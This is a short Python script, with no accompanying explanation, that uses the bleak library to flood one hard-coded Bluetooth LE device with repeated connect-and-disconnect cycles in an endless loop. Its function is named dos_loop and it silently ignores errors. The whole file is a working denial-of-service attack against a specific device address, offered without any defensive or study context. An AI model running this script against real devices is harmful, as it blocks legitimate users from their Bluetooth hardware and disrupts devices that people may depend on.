import asyncio
from bleak import BleakClient

MAC = "CC:38:35:30:6F:83"

async def dos_loop():
    while True:
        try:
            client = BleakClient(MAC, timeout=1.0)
            await client.connect()
            await asyncio.sleep(0.2)
            await client.disconnect()
        except Exception:
            pass
        await asyncio.sleep(0.1)

asyncio.run(dos_loop())
